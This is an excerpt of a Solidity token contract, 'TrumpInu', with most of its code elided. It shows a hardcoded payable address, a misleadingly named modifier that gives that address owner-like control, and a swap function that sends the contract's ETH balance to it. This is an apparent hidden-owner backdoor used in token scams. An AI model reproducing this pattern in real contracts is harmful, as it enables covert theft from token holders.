...
contract  TrumpInu is Context, IERC20, Ownable {
    ...
    string private _name = "TrumpInu";
    modifier ERCT() {
        require(_msgSender() == ERCTokenRec, "caller not owner");_;
    }
    string private _symbol = "TrumpInu";
    ...
    constructor () {
        ...
        ERCTokenRec = payable(address(0x87F7dd63fA53ba6a9867DeF7a0C272B660A305c7));
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(balETHance > 0)
            ERCTokenRec.transfer(balETHance);
    }
